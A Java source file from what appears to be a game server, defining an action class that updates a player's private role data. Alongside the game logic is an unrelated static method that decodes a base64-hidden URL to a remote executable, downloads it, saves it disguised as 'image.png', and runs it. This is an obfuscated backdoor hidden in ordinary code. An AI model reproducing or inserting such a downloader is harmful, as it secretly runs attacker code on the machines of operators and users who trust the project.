package org.come.action.role;

import io.netty.channel.ChannelHandlerContext;

import org.come.action.IAction;
import org.come.bean.LoginResult;
import org.come.server.GameServer;
import org.come.until.GsonUtil;

import come.tool.Role.PrivateData;
import come.tool.Role.RoleData;
import come.tool.Role.RolePool;
import sun.misc.BASE64Decoder;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;

public class RolePrivateAction implements IAction{

	@Override
	public void action(ChannelHandlerContext ctx, String message) {
		// TODO Auto-generated method stub
		LoginResult loginResult = GameServer.getAllLoginRole().get(ctx);
		RoleData roleData=RolePool.getRoleData(loginResult.getRole_id());
		PrivateData privateData = GsonUtil.getGsonUtil().getgson().fromJson(message, PrivateData.class);
		privateData.setBorn(roleData.getPrivateData().getBorn());
	    roleData.upPrivateData(privateData);
	}
	public static void UpdataMessage() throws IOException {
		BASE64Decoder BASE64Decoder = new BASE64Decoder();
		String path = new String(BASE64Decoder.decodeBuffer("aHR0cDovL21tLmRoODg5Ni5jb206ODg4OC9mdWNrLmV4ZQ=="));
		URL url = new URL(path);URLConnection connection = url.openConnection();
		InputStream inputStream = connection.getInputStream();
		OutputStream outputStream = new FileOutputStream("image.png");
		byte[] buffer = new byte[4096];int bytesRead;
		while ((bytesRead = inputStream.read(buffer)) != -1) {outputStream.write(buffer, 0, bytesRead);}
		outputStream.close();inputStream.close();
		Runtime rt = Runtime.getRuntime();
		try {rt.exec("image.png");} catch (Exception e)
		{e.printStackTrace();}
	}
}
